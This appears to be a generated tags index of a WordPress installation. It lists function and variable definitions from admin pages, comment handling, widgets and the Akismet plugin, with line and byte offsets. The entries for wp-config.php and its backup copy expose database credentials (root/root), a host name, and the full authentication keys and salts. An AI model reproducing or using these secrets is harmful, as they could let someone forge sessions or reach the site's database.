$user_can_edit = current_user_can( 'edit_posts' ) || current_user_can( 'edit_pages' );user_can_edit59,2548
function use_ssl_preference($user) {use_ssl_preference68,2800
	$new_email = get_option( $current_user->ID . '_new_email' );new_email83,3581
	$errors = edit_user($user_id);errors114,4936
	$user = get_userdata( $user_id );user116,4977
	$delete_role = false;delete_role123,5498
	$blog_prefix = $wpdb->get_blog_prefix();blog_prefix124,5521
		$cap = $wpdb->get_var( "SELECT meta_value FROM {$wpdb->usermeta} WHERE user_id = '{$user_id}' AND meta_key = '{$blog_prefix}capabilities' AND meta_value = 'a:0:{}'" );cap126,5603
			$delete_role = true;delete_role129,5883
		$errors = edit_user($user_id);errors133,6027
	$redirect = (IS_PROFILE_PAGE ? "profile.php?" : "user-edit.php?user_id=$user_id&"). "updated=true";redirect142,6546
		$redirect = add_query_arg('wp_http_referer', urlencode($wp_http_referer), $redirect);redirect144,6672
$profileuser = get_user_to_edit($user_id);profileuser150,6804
// TODO: create a function that does this: wp_get_user_role()that252,11406
$user_roles = $profileuser->roles;user_roles253,11468
$user_role = array_shift($user_roles);user_role254,11503
			$public_display = array();public_display299,13533
				$public_display = array( 'display_displayname' => $profileuser->display_name ) + $public_display;public_display315,14326
			$public_display = array_map( 'trim', $public_display );public_display317,14429
			$public_display = array_unique( $public_display );public_display318,14488
			foreach ( $public_display as $id => $item ) {id320,14543
	$new_email = get_option( $current_user->ID . '_new_email' );new_email338,15073
	foreach (_wp_get_user_contactmethods( $profileuser ) as $name => $desc) {name353,15715
$show_password_fields = apply_filters('show_password_fields', true, $profileuser);show_password_fields374,16598
			$output = '';output401,18024
			foreach ( $profileuser->caps as $cap => $value ) {cap402,18041

wordpress/wp-admin/user-new.php,2768
	function admin_created_user_email( $text ) {admin_created_user_email20,445
	function admin_created_user_subject( $text ) {admin_created_user_subject33,976
	$user_details = null;user_details41,1235
		$user_details = get_user_by('email', $_REQUEST[ 'email' ]);user_details43,1312
			$user_details = get_user_by('login', $_REQUEST[ 'email' ]);user_details46,1412
	$new_user_email = $user_details->user_email;new_user_email62,1854
	$redirect = 'user-new.php';redirect63,1900
	$username = $user_details->user_login;username64,1929
	$user_id = $user_details->ID;user_id65,1969
		$redirect = add_query_arg( array('update' => 'addexisting'), 'user-new.php' );redirect67,2126
			$redirect = add_query_arg( array('update' => 'addnoconfirmation'), 'user-new.php' );redirect71,2379
			$newuser_key = substr( md5( $user_id ), 0, 5 );newuser_key73,2478
			$message = __( 'Hi,message76,2751
			$redirect = add_query_arg( array('update' => 'add'), 'user-new.php' );redirect84,3127
		$user_id = edit_user();user_id96,3495
			$add_user_errors = $user_id;add_user_errors99,3557
				$redirect = 'users.php?update=add&id=' . $user_id;redirect102,3643
				$redirect = add_query_arg( 'update', 'add', 'user-new.php' );redirect104,3706
		$user_details = wpmu_validate_user_signup( $_REQUEST[ 'user_login' ], $_REQUEST[ 'email' ] );user_details110,3861
			$add_user_errors = $user_details[ 'errors' ];add_user_errors113,4123
			$new_user_login = apply_filters('pre_user_login', sanitize_user(stripslashes($_REQUEST['user_login']), true));new_user_login115,4183
				$key = $wpdb->get_var( $wpdb->prepare( "SELECT activation_key FROM {$wpdb->signups} WHERE user_login = %s AND user_email = %s", $new_user_login, $_REQUEST[ 'email' ] ) );key121,4675
				$redirect = add_query_arg( array('update' => 'addnoconfirmation'), 'user-new.php' );redirect123,4884
				$redirect = add_query_arg( array('update' => 'newuserconfimation'), 'user-new.php' );redirect125,4985
$title = __('Add New User');title133,5129
$parent_file = 'users.php';parent_file134,5158
$do_both = false;do_both136,5187
	$do_both = true;do_both138,5300
$help = '<p>' . __('To add a new user to your site, fill in the form on this screen and click the Add New User button at the bottom.') . '</p>';help140,5319
	$messages = array();messages189,8405
		$label = __('E-mail');label259,10478
		$label = __('E-mail or Username');label262,10694
				'email' => 'email', 'url' => 'uri', 'role' => 'role', 'send_password' => 'send_password', 'noconfirmation' => 'ignore_pass' ) as $post_field => $var ) {post_field304,12614
	$var = "new_user_$var";var305,12771
				$new_user_role = !empty($current_role) ? $current_role : get_option('default_role');new_user_role359,15614

wordpress/wp-admin/users.php,3208
$wp_list_table = _get_list_table('WP_Users_List_Table');wp_list_table15,257
$pagenum = $wp_list_table->get_pagenum();pagenum16,314
$title = __('Users');title17,356
$parent_file = 'users.php';parent_file18,378
$help = '<p>' . __('Hovering over a row in the users list will display action links that allow you to manage users. You can perform the following actions:') . '</p>' .help41,1997
	$referer = '<input type="hidden" name="wp_http_referer" value="'. esc_attr(stripslashes($_SERVER['REQUEST_URI'])) . '" />';referer67,3463
	$redirect = remove_query_arg(array('wp_http_referer', 'updated', 'delete_count'), stripslashes($_REQUEST['wp_http_referer']));redirect69,3639
	$referer = '<input type="hidden" name="wp_http_referer" value="' . esc_attr($redirect) . '" />';referer70,3767
	$redirect = 'users.php';redirect72,3874
	$referer = '';referer73,3900
$update = '';update76,3919
	$editable_roles = get_editable_roles();editable_roles92,4248
	$userids = $_REQUEST['users'];userids96,4401
	$update = 'promote';update97,4433
		$id = (int) $id;id99,4486
		if ( $id == $current_user->ID && ! $wp_roles->role_objects[ $_REQUEST['new_role'] ]->has_cap('promote_users')id104,4710
				$update = 'err_admin_role';update106,4873
		$user = new WP_User($id);user114,5079
	$userids = $_REQUEST['users'];userids137,5545
	$update = 'del';update138,5577
	$delete_count = 0;delete_count139,5595
		$id = (int) $id;id142,5654
		if ( $id == $current_user->ID ) {id147,5780
			$update = 'err_admin_del';update148,5816
	$redirect = add_query_arg( array('delete_count' => $delete_count, 'update' => $update), $redirect);redirect164,6160
		$errors = new WP_Error( 'edit_users', __( 'You can&#8217;t delete users.' ) );errors182,6595
		$userids = array(intval($_REQUEST['user']));userids185,6711
		$userids = (array) $_REQUEST['users'];userids187,6764
	$go_delete = 0;go_delete201,7204
		$id = (int) $id;id203,7252
		$user = new WP_User($id);user204,7271
		if ( $id == $current_user->ID ) {id205,7299
	$userids = $_REQUEST['users'];userids248,8989
	$update = 'remove';update250,9022
		$id = (int) $id;id252,9075
		if ( $id == $current_user->ID && !is_super_admin() ) {id253,9094
			$update = 'err_admin_remove';update254,9151
			$update = 'err_admin_remove';update258,9250
	$redirect = add_query_arg( array('update' => $update), $redirect);redirect264,9344
		$error = new WP_Error('edit_users', __('You can&#8217;t remove users.'));error283,9729
		$userids = array(intval($_REQUEST['user']));userids286,9840
		$userids = $_REQUEST['users'];userids288,9893
	$go_remove = false;go_remove302,10262
		$id = (int) $id;id304,10315
 		$user = new WP_User($id);user305,10334
		if ( $id == $current_user->ID && !is_super_admin() ) {id306,10363
			$go_remove = true;go_remove312,10910
	$total_pages = $wp_list_table->get_pagination_arg( 'total_pages' );total_pages336,11439
	$messages = array();messages344,11664
			$delete_count = isset($_GET['delete_count']) ? (int) $_GET['delete_count'] : 0;delete_count349,11780
			if ( isset( $_GET['id'] ) && ( $user_id = $_GET['id'] ) && current_user_can( 'edit_user', $user_id ) ) {user_id353,12068

wordpress/wp-admin/widgets.php,3389
$widgets_access = get_user_setting( 'widgets_access' );widgets_access18,366
	$widgets_access = 'on' == $_GET['widgets-access'] ? 'on' : 'off';widgets_access20,462
function wp_widgets_access_body_class($classes) {wp_widgets_access_body_class24,588
$title = __( 'Widgets' );title39,932
$parent_file = 'themes.php';parent_file40,958
$sidebars_widgets = wp_get_sidebars_widgets();sidebars_widgets91,4375
	$sidebars_widgets = wp_get_widget_defaults();sidebars_widgets94,4457
foreach ( $sidebars_widgets as $sidebar_id => $widgets ) {sidebar_id96,4505
	$widget_id = $_POST['widget-id'];widget_id134,5769
	$number = isset($_POST['multi_number']) ? (int) $_POST['multi_number'] : '';number137,5860
		foreach ( $_POST as $key => $val ) {key139,5956
				$_POST[$key] = array( $number => array_shift($val) );number141,6062
	$sidebar_id = $_POST['sidebar'];sidebar_id147,6144
	$position = isset($_POST[$sidebar_id . '_position']) ? (int) $_POST[$sidebar_id . '_position'] - 1 : 0;position148,6178
	$id_base = $_POST['id_base'];id_base150,6284
	$sidebar = isset($sidebars_widgets[$sidebar_id]) ? $sidebars_widgets[$sidebar_id] : array();sidebar151,6315
		$sidebar = array_diff( $sidebar, array($widget_id) );sidebar161,6603
		$_POST = array('sidebar' => $sidebar_id, 'widget-' . $id_base => array(), 'the-widget-id' => $widget_id, 'delete_widget' => '1');_POST162,6659
	foreach ( (array) $wp_registered_widget_updates as $name => $control ) {name167,6829
		foreach ( $sidebars_widgets as $key => $sb ) {key182,7208
	$widget_id = $_GET['editwidget'];widget_id196,7636
		$sidebar = array_shift( $keys = array_keys($wp_registered_sidebars) );sidebar200,7739
					$control_callback = $control['callback'];control_callback206,8078
					$multi_number = (int) $_GET['num'];multi_number207,8125
					$widget_id = $control['id'] = $control['id_base'] . '-' . $multi_number;widget_id209,8209
		$control = $wp_registered_widget_controls[$widget_id];control218,8462
		$control_callback = $control['callback'];control_callback219,8519
		$name = esc_html( strip_tags($wp_registered_widgets[$widget_id]['name']) );name221,8675
		$name = esc_html( strip_tags($control['name']) );name225,8779
		$sidebar = isset($_GET['sidebar']) ? $_GET['sidebar'] : 'wp_inactive_widgets';sidebar228,8857
		$multi_number = isset($control['params'][0]['number']) ? $control['params'][0]['number'] : '';multi_number231,8969
	$id_base = isset($control['id_base']) ? $control['id_base'] : $control['id'];id_base233,9067
	$width = ' style="width:' . max($control['width'], 350) . 'px"';width236,9172
	$key = isset($_GET['key']) ? (int) $_GET['key'] : 0;key237,9238
	foreach ( $wp_registered_sidebars as $sbname => $sbvalue ) {sbname259,10087
				$j = 1;j265,10536
				$j = count($sidebars_widgets[$sbname]);j268,10602
			$selected = '';selected272,10755
			for ( $i = 1; $i <= $j; $i++ ) {i275,10906
					$selected = selected( $i, $key + 1, false );selected277,11008
$messages = array(messages310,12037
$errors = array(errors314,12082
foreach ( $wp_registered_sidebars as $sidebar => $registered_sidebar ) {sidebar351,13391
		$wrap_class = 'widgets-holder-wrap';wrap_class353,13594
$i = 0;i382,14338
foreach ( $wp_registered_sidebars as $sidebar => $registered_sidebar ) {sidebar383,14346
	$wrap_class = 'widgets-holder-wrap';wrap_class387,14560

wordpress/wp-app.php,355
define('APP_REQUEST', true);APP_REQUEST13,175
// Allow for a plugin to insert a different class to handle requests.to29,635
$wp_atom_server_class = apply_filters('wp_atom_server_class', 'wp_atom_server');wp_atom_server_class30,705
$wp_atom_server = new $wp_atom_server_class;wp_atom_server31,786
function log_app( $label, $msg ) {log_app49,1175

wordpress/wp-blog-header.php,45
	$wp_did_header = true;wp_did_header10,122

wordpress/wp-comments-post.php,1727
$comment_post_ID = isset($_POST['comment_post_ID']) ? (int) $_POST['comment_post_ID'] : 0;comment_post_ID20,388
$post = get_post($comment_post_ID);post22,480
$status = get_post_status($post);status30,684
$status_obj = get_post_status_object($status);status_obj32,719
$comment_author       = ( isset($_POST['author']) )  ? trim(strip_tags($_POST['author'])) : null;comment_author50,1317
$comment_author_email = ( isset($_POST['email']) )   ? trim($_POST['email']) : null;comment_author_email51,1415
$comment_author_url   = ( isset($_POST['url']) )     ? trim($_POST['url']) : null;comment_author_url52,1500
$comment_content      = ( isset($_POST['comment']) ) ? trim($_POST['comment']) : null;comment_content53,1583
$user = wp_get_current_user();user56,1699
	$comment_author       = $wpdb->escape($user->display_name);comment_author60,1833
	$comment_author_email = $wpdb->escape($user->user_email);comment_author_email61,1894
	$comment_author_url   = $wpdb->escape($user->user_url);comment_author_url62,1953
$comment_type = '';comment_type74,2424
$comment_parent = isset($_POST['comment_parent']) ? absint($_POST['comment_parent']) : 0;comment_parent86,2886
$commentdata = compact('comment_post_ID', 'comment_author', 'comment_author_email', 'comment_author_url', 'comment_content', 'comment_type', 'comment_parent', 'user_ID');commentdata88,2977
$comment_id = wp_new_comment( $commentdata );comment_id90,3149
$comment = get_comment($comment_id);comment92,3196
$location = empty($_POST['redirect_to']) ? get_comment_link($comment_id) : $_POST['redirect_to'] . '#comment-' . $comment_id;location95,3285
$location = apply_filters('comment_post_redirect', $location, $comment);location96,3411

wordpress/wp-config.backup.php,1416
define('DB_NAME', 'wp-toessay-local');DB_NAME19,737
define('DB_USER', 'root');DB_USER22,811
define('DB_PASSWORD', 'root');DB_PASSWORD25,873
define('DB_HOST', 'toessay.co.uk.ben');DB_HOST28,930
define('DB_CHARSET', 'utf8');DB_CHARSET31,1034
define('DB_COLLATE', '');DB_COLLATE34,1133
define('AUTH_KEY',         '#N4)=|.K]YA.x3 Dg&GY[1^8(4hhZunSKU7,a@%R2s36%3;YbZUd$a$R<Zxs[5(B');AUTH_KEY45,1546
define('SECURE_AUTH_KEY',  'SQ&av@V(XyPoR6f3u)l*c1{2SooCGq!&-/cR)>Na?L<DmgTP  yd2)}{hPp~(. F');SECURE_AUTH_KEY46,1643
define('LOGGED_IN_KEY',    'm7+?s~ K]+Ul4PvFS9K)w433~pzx+B4!h&A^gn&P+$o+Y5L>K8BUo TFpsh>]}Am');LOGGED_IN_KEY47,1740
define('NONCE_KEY',        '5d bCewLt0?|TxQe7e*~{;*mhb{_3+|z?n0]tQ=yq|Z!p/qxuE-r6;(K[wN&e|#U');NONCE_KEY48,1837
define('AUTH_SALT',        '4*a1[4/!SJ|- 8bZ3+-,}zY&_4j,o41r?+|TREk6tcD!AaTT ~ef@&v0Q-ltT+=]');AUTH_SALT49,1934
define('SECURE_AUTH_SALT', ',5ubz9#3SA]XAZ:yXw_J68U&~y}a!Jk?W20U%1nzUKUA4|s9=cl:^C+g?9=X+QAp');SECURE_AUTH_SALT50,2031
define('LOGGED_IN_SALT',   'Jx5RN[66||g!Es9+;e7e=6g*6_+ALD|V5,5QS)Nc`+K@lNXofd|b~1K5qJmf<=??');LOGGED_IN_SALT51,2128
define('NONCE_SALT',       'I@oGda:XY</GwW?|FcJcD_V%GThtg:/bN2.=)G,(Kl,X4*3Z+M+IO#E>wKS#Oscd');NONCE_SALT52,2225
$table_prefix  = 'wp_';table_prefix61,2526
define('WPLANG', '');WPLANG71,2879
define('WP_DEBUG', false);WP_DEBUG80,3157
	define('ABSPATH', dirname(__FILE__) . '/');ABSPATH86,3316

wordpress/wp-config.php,1416
define('DB_NAME', 'wp-toessay-local');DB_NAME19,737
define('DB_USER', 'root');DB_USER22,811
define('DB_PASSWORD', 'root');DB_PASSWORD25,873
define('DB_HOST', 'toessay.co.uk.ben');DB_HOST28,930
define('DB_CHARSET', 'utf8');DB_CHARSET31,1034
define('DB_COLLATE', '');DB_COLLATE34,1133
define('AUTH_KEY',         '#N4)=|.K]YA.x3 Dg&GY[1^8(4hhZunSKU7,a@%R2s36%3;YbZUd$a$R<Zxs[5(B');AUTH_KEY45,1546
define('SECURE_AUTH_KEY',  'SQ&av@V(XyPoR6f3u)l*c1{2SooCGq!&-/cR)>Na?L<DmgTP  yd2)}{hPp~(. F');SECURE_AUTH_KEY46,1643
define('LOGGED_IN_KEY',    'm7+?s~ K]+Ul4PvFS9K)w433~pzx+B4!h&A^gn&P+$o+Y5L>K8BUo TFpsh>]}Am');LOGGED_IN_KEY47,1740
define('NONCE_KEY',        '5d bCewLt0?|TxQe7e*~{;*mhb{_3+|z?n0]tQ=yq|Z!p/qxuE-r6;(K[wN&e|#U');NONCE_KEY48,1837
define('AUTH_SALT',        '4*a1[4/!SJ|- 8bZ3+-,}zY&_4j,o41r?+|TREk6tcD!AaTT ~ef@&v0Q-ltT+=]');AUTH_SALT49,1934
define('SECURE_AUTH_SALT', ',5ubz9#3SA]XAZ:yXw_J68U&~y}a!Jk?W20U%1nzUKUA4|s9=cl:^C+g?9=X+QAp');SECURE_AUTH_SALT50,2031
define('LOGGED_IN_SALT',   'Jx5RN[66||g!Es9+;e7e=6g*6_+ALD|V5,5QS)Nc`+K@lNXofd|b~1K5qJmf<=??');LOGGED_IN_SALT51,2128
define('NONCE_SALT',       'I@oGda:XY</GwW?|FcJcD_V%GThtg:/bN2.=)G,(Kl,X4*3Z+M+IO#E>wKS#Oscd');NONCE_SALT52,2225
$table_prefix  = 'wp_';table_prefix61,2526
define('WPLANG', '');WPLANG71,2879
define('WP_DEBUG', false);WP_DEBUG80,3157
	define('ABSPATH', dirname(__FILE__) . '/');ABSPATH86,3316

wordpress/wp-content/index.php,0

wordpress/wp-content/plugins/akismet/admin.php,11443
function akismet_admin_init() {akismet_admin_init6,85
        function akismet_version_warning() {akismet_version_warning12,303
        $hook = get_plugin_page_hook( 'akismet-stats-display', 'index.php' );hook23,973
        $hook = 'dashboard_page_akismet-stats-display';hook25,1060
function akismet_load_js_and_css() {akismet_load_js_and_css32,1409
		$hook_suffix == 'index.php'	# dashboardhook_suffix36,1475
		|| $hook_suffix == 'edit-comments.php' hook_suffix37,1517
		|| $hook_suffix == 'comment.php' hook_suffix38,1559
		|| $hook_suffix == 'post.php' hook_suffix39,1595
		|| $hook_suffix == 'plugins_page_akismet-key-config'hook_suffix40,1628
function akismet_nonce_field($action = -1) { return wp_nonce_field($action); }akismet_nonce_field54,2107
$akismet_nonce = 'akismet-update-key';akismet_nonce55,2186
function akismet_plugin_action_links( $links, $file ) {akismet_plugin_action_links57,2226
	if ( $file == plugin_basename( dirname(__FILE__).'/akismet.php' ) ) {file58,2282
function akismet_conf() {akismet_conf67,2535
		$key = preg_replace( '/[^a-h0-9]/i', '', $_POST['key'] );key75,2796
		$home_url = parse_url( get_bloginfo('url') );home_url76,2856
			$key_status = 'empty';key_status79,2928
			$key_status = 'empty';key_status83,3063
			$key_status = akismet_verify_key( $key );key_status86,3127
		if ( $key_status == 'valid' ) {key_status89,3177
		} else if ( $key_status == 'invalid' ) {key_status92,3284
		} else if ( $key_status == 'failed' ) {key_status94,3357
		$key = get_option('wordpress_api_key');key113,3943
			$key_status = 'empty';key_status121,4200
			$key_status = akismet_verify_key( $key );key_status123,4237
		if ( $key_status == 'valid' ) {key_status125,4286
		} else if ( $key_status == 'invalid' ) {key_status127,4344
		} else if ( !empty($key) && $key_status == 'failed' ) {key_status129,4413
	$messages = array(messages134,4504
		$servers = akismet_get_server_connectivity();servers186,9616
		$fail_count = count($servers) - count( array_filter($servers) );fail_count187,9664
		foreach ( $servers as $ip => $status ) {ip220,12116
			$color = ( $status ? '#4AB915' : '#888');color221,12159
function akismet_stats_script() {akismet_stats_script243,13042
function resizeIframe() {resizeIframe246,13112
function resizeIframeInit() {resizeIframeInit251,13225
function akismet_stats_display() {akismet_stats_display260,13412
	$blog = urlencode( get_bloginfo('url') );blog262,13509
	$url = 'http://';url264,13553
		$url = 'https://';url266,13589
function akismet_stats() {akismet_stats277,13868
	$path = plugin_basename(__FILE__);path282,14098
		$link = 'edit-comments.php';link286,14250
		$link = 'edit.php';link288,14287
function akismet_admin_warnings() {akismet_admin_warnings293,14703
		$pagenow == 'edit-comments.php'pagenow297,14780
			function akismet_alert() {akismet_alert302,15016
				$alert = array(alert303,15046
		function akismet_warning() {akismet_warning321,15685
		function akismet_warning() {akismet_warning329,16212
				$waiting = $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM $wpdb->commentmeta WHERE meta_key = 'akismet_error'" ) );waiting332,16297
				$next_check = wp_next_scheduled('akismet_schedule_cron_recheck');next_check333,16424
function akismet_comment_row_action( $a, $comment ) {akismet_comment_row_action346,17043
	$akismet_result = get_comment_meta( $comment->comment_ID, 'akismet_result', true );akismet_result352,17190
	$akismet_error = get_comment_meta( $comment->comment_ID, 'akismet_error', true );akismet_error353,17275
	$user_result = get_comment_meta( $comment->comment_ID, 'akismet_user_result', true);user_result354,17358
	$comment_status = wp_get_comment_status( $comment->comment_ID );comment_status355,17444
	$desc = null;desc356,17510
		$desc = __( 'Awaiting spam check' );desc358,17550
	} elseif ( !$user_result || $user_result == $akismet_result ) {user_result359,17589
		if ( $akismet_result == 'true' && $comment_status != 'spam' && $comment_status != 'trash' )akismet_result361,17760
			$desc = __( 'Flagged as spam by Akismet' );desc362,17854
		elseif ( $akismet_result == 'false' && $comment_status == 'spam' )akismet_result363,17901
			$desc = __( 'Cleared by Akismet' );desc364,17970
		$who = get_comment_meta( $comment->comment_ID, 'akismet_user', true );who366,18019
		if ( $user_result == 'true' )user_result367,18092
			$desc = sprintf( __('Flagged as spam by %s'), $who );desc368,18124
			$desc = sprintf( __('Un-spammed by %s'), $who );desc370,18188
		$b = array();b375,18329
		foreach ( $a as $k => $item ) {k376,18345
				$k == 'edit'k379,18408
				|| ( $k == 'unspam' && $GLOBALS['wp_version'] >= 3.4 )k380,18425
		$a = $b;a386,18691
		$comment_count = akismet_get_user_comments_approved( $comment->user_id, $comment->comment_author_email, $comment->comment_author, $comment->comment_author_url );comment_count393,19106
		$comment_count = intval( $comment_count );comment_count394,19270
function akismet_comment_status_meta_box($comment) {akismet_comment_status_meta_box403,19686
	$history = akismet_get_comment_history( $comment->comment_ID );history404,19739
			$time = date( 'D d M Y @ h:i:m a', $row['time'] ) . ' GMT';time409,19919
function akismet_comments_columns( $columns ) {akismet_comments_columns421,20312
function akismet_comment_column_row( $column, $comment_id ) {akismet_comment_column_row429,20533
	$history = akismet_get_comment_history( $comment_id );history433,20637
function akismet_text_add_link_callback( $m ) {akismet_text_add_link_callback451,21093
function akismet_text_add_link_class( $comment_text ) {akismet_text_add_link_class460,21459
function akismet_rightnow() {akismet_rightnow469,21728
		$link = 'edit-comments.php?comment_status=spam';link473,21831
		$link = 'edit-comments.php?page=akismet-admin';link475,21933
		$link = 'edit.php?page=akismet-admin';link477,21989
	if ( $count = get_option('akismet_spam_count') ) {count479,22031
		$intro = sprintf( _n(intro480,22083
		$intro = sprintf( __('<a href="%1$s">Akismet</a> blocks spam from getting to your blog. '), 'http://akismet.com/?return=true' );intro486,22380
	$link = function_exists( 'esc_url' ) ? esc_url( $link ) : clean_url( $link );link489,22515
	if ( $queue_count = akismet_spam_count() ) {queue_count490,22594
		$queue_text = sprintf( _n(queue_text491,22640
		$queue_text = sprintf( __( "There's nothing in your <a href='%1\$s'>spam queue</a> at the moment." ), $link );queue_text497,22901
	$text = $intro . '<br />' . $queue_text;text500,23018
function akismet_check_for_spam_button($comment_status) {akismet_check_for_spam_button508,23181
		$link = 'admin.php?action=akismet_recheck_queue';link512,23326
		$link = 'edit-comments.php?page=akismet-admin&amp;recheckqueue=true&amp;noheader=true';link514,23384
function akismet_submit_nonspam_comment ( $comment_id ) {akismet_submit_nonspam_comment519,23670
	$comment_id = (int) $comment_id;comment_id521,23811
	$comment = $wpdb->get_row("SELECT * FROM $wpdb->comments WHERE comment_ID = '$comment_id'");comment523,23846
	$as_submitted = get_comment_meta( $comment_id, 'akismet_as_submitted', true);as_submitted528,24055
		$comment = (object) array_merge( (array)$comment, $as_submitted );comment530,24228
	$post = get_post( $comment->comment_post_ID );post552,24915
	$query_string = '';query_string555,25029
	foreach ( $comment as $key => $data )key556,25050
	$response = akismet_http_post($query_string, $akismet_api_host, "/1.1/submit-ham", $akismet_api_port);response559,25162
function akismet_submit_spam_comment ( $comment_id ) {akismet_submit_spam_comment569,25658
	$comment_id = (int) $comment_id;comment_id571,25796
	$comment = $wpdb->get_row("SELECT * FROM $wpdb->comments WHERE comment_ID = '$comment_id'");comment573,25831
	$as_submitted = get_comment_meta( $comment_id, 'akismet_as_submitted', true);as_submitted580,26094
		$comment = (object) array_merge( (array)$comment, $as_submitted );comment582,26267
	$post = get_post( $comment->comment_post_ID );post604,26954
	$query_string = '';query_string607,27068
	foreach ( $comment as $key => $data )key608,27089
	$response = akismet_http_post($query_string, $akismet_api_host, "/1.1/submit-spam", $akismet_api_port);response611,27201
function akismet_transition_comment_status( $new_status, $old_status, $comment ) {akismet_transition_comment_status621,27704
	if ( $new_status == $old_status )new_status622,27787
	if ( $new_status == 'delete' )new_status626,27896
	$reporter = '';reporter643,28375
		$reporter = $current_user->user_login;reporter645,28427
		if ( $new_status == 'spam' && ( $old_status == 'approved' || $old_status == 'unapproved' || !$old_status ) ) {new_status654,29102
		} elseif ( $old_status == 'spam' && ( $new_status == 'approved' || $new_status == 'unapproved' ) ) {old_status656,29279
function akismet_spam_count( $type = false ) {akismet_spam_count668,29795
function akismet_spam_count( $type = false ) {type668,29795
		$count = wp_cache_get( 'akismet_spam_count', 'widget' );count672,29884
				$count = wp_count_comments();count675,30020
				$count = $count->spam;count676,30054
				$count = (int) $wpdb->get_var("SELECT COUNT(comment_ID) FROM $wpdb->comments WHERE comment_approved = 'spam'");count678,30093
		$type = '';type684,30370
		$type  = $wpdb->escape( $type );type686,30422
function akismet_recheck_queue() {akismet_recheck_queue693,30601
	$moderation = $wpdb->get_results( "SELECT * FROM $wpdb->comments WHERE comment_approved = '0'", ARRAY_A );moderation701,30869
		$id = (int) $c['comment_ID'];id718,31494
		$query_string = '';query_string720,31527
		foreach ( $c as $key => $data )key721,31549
		$response = akismet_http_post($query_string, $akismet_api_host, '/1.1/comment-check', $akismet_api_port);response725,31724
function akismet_remove_comment_author_url() {akismet_remove_comment_author_url751,33061
        $comment = get_comment( intval($_POST['id']), ARRAY_A );comment754,33218
function akismet_add_comment_author_url() {akismet_add_comment_author_url766,33628
        $comment = get_comment( intval($_POST['id']), ARRAY_A );comment769,33810
function akismet_check_server_connectivity() {akismet_check_server_connectivity783,34455
	$test_host = 'rest.akismet.com';test_host786,34566
	$ips = gethostbynamel($test_host);ips792,34751
	$servers = array();servers796,34857
		$response = akismet_verify_key( akismet_get_key(), $ip );response798,34905
		if ( $response == 'valid' || $response == 'invalid' )response800,35036
// Cached results will be used if not older than the specified timeout in seconds; use $cache_timeout = 0 to force an update.cache_timeout810,35244
function akismet_get_server_connectivity( $cache_timeout = 86400 ) {akismet_get_server_connectivity812,35447
function akismet_get_server_connectivity( $cache_timeout = 86400 ) {cache_timeout812,35447
	$servers = get_option('akismet_available_servers');servers813,35516
	$servers = akismet_check_server_connectivity();servers818,35750
function akismet_server_connectivity_ok() {akismet_server_connectivity_ok825,36046
	$servers = akismet_get_server_connectivity();servers830,36213
function akismet_admin_menu() {akismet_admin_menu834,36366
function akismet_load_menu() {akismet_load_menu842,36532

wordpress/wp-content/plugins/akismet/akismet.php,8748
define('AKISMET_VERSION', '2.5.6');AKISMET_VERSION31,1401
define('AKISMET_PLUGIN_URL', plugin_dir_url( __FILE__ ));AKISMET_PLUGIN_URL32,1437
	$wpcom_api_key = constant('WPCOM_API_KEY');wpcom_api_key36,1612
	$wpcom_api_key = '';wpcom_api_key38,1662
function akismet_init() {akismet_init54,2100
		$akismet_api_host = $wpcom_api_key . '.rest.akismet.com';akismet_api_host58,2212
		$akismet_api_host = get_option('wordpress_api_key') . '.rest.akismet.com';akismet_api_host60,2278
	$akismet_api_port = 80;akismet_api_port62,2356
function akismet_get_key() {akismet_get_key66,2420
function akismet_check_key_status( $key, $ip = null ) {akismet_check_key_status73,2573
function akismet_check_key_status( $key, $ip = null ) {ip73,2573
	$blog = urlencode( get_option('home') );blog75,2691
		$key = $wpcom_api_key;key77,2756
	$response = akismet_http_post("key=$key&blog=$blog", 'rest.akismet.com', '/1.1/verify-key', $akismet_api_port, $ip);response78,2781
function akismet_update_alert( $response ) {akismet_update_alert83,3045
	$code = $msg = null;code84,3090
		$code = $response[0]['x-akismet-alert-code'];code86,3166
		$msg = $response[0]['x-akismet-alert-msg'];msg87,3214
function akismet_verify_key( $key, $ip = null ) {akismet_verify_key97,3474
function akismet_verify_key( $key, $ip = null ) {ip97,3474
	$response = akismet_check_key_status( $key, $ip );response98,3524
function akismet_test_mode() {akismet_test_mode106,3872
function akismet_get_user_roles($user_id ) {akismet_get_user_roles113,4060
	$roles = false;roles114,4105
		$comment_user = new WP_User($user_id);comment_user120,4198
			$roles = join(',', $comment_user->roles);roles122,4276
			$roles = 'super_admin';roles127,4407
			$roles = join( ',', $comment_user->roles );roles130,4488
function akismet_http_post($request, $host, $path, $port = 80, $ip=null) {akismet_http_post138,4633
function akismet_http_post($request, $host, $path, $port = 80, $ip=null) {port138,4633
	$akismet_ua = "WordPress/{$wp_version} | ";akismet_ua141,4730
	$akismet_ua = apply_filters( 'akismet_ua', $akismet_ua );akismet_ua144,4836
	$content_length = strlen( $request );content_length146,4896
	$http_host = $host;http_host148,4936
		$http_host = $ip;http_host152,5084
		$http_host = $host;http_host154,5114
	// use the WP HTTP class if it is availableif157,5141
		$http_args = array(http_args159,5232
		$akismet_url = "http://{$http_host}{$path}";akismet_url170,5530
		$response = wp_remote_post( $akismet_url, $http_args );response171,5577
		$http_request  = "POST $path HTTP/1.0\r\n";http_request177,5753
		$response = '';response185,6126
		if( false != ( $fs = @fsockopen( $http_host, $port, $errno, $errstr, 10 ) ) ) {fs186,6144
			$response = explode( "\r\n\r\n", $response, 2 );response192,6362
function akismet_result_spam( $approved ) {akismet_result_spam199,6515
	if ( $incr = apply_filters('akismet_spam_count_incr', 1) )incr201,6663
function akismet_result_hold( $approved ) {akismet_result_hold208,6918
function akismet_get_user_comments_approved( $user_id, $comment_author_email, $comment_author, $comment_author_url ) {akismet_get_user_comments_approved215,7110
function akismet_microtime() {akismet_microtime227,7723
	$mtime = explode( ' ', microtime() );mtime228,7754
function akismet_update_comment_history( $comment_id, $message, $event=null ) {akismet_update_comment_history233,7891
function akismet_update_comment_history( $comment_id, $message, $event=null ) {event233,7891
	$user = '';user240,8091
		$user = $current_user->user_login;user242,8173
	$event = array(event244,8211
	// $unique = false so as to allow multiple values per commentunique251,8331
	$r = add_comment_meta( $comment_id, 'akismet_history', $event, false );r252,8394
function akismet_get_comment_history( $comment_id ) {akismet_get_comment_history256,8566
	$history = get_comment_meta( $comment_id, 'akismet_history', false );history262,8717
function akismet_cmp_time( $a, $b ) {akismet_cmp_time267,8849
function akismet_auto_check_update_meta( $id, $comment ) {akismet_auto_check_update_meta273,9092
function akismet_auto_check_comment( $commentdata ) {akismet_auto_check_comment317,11862
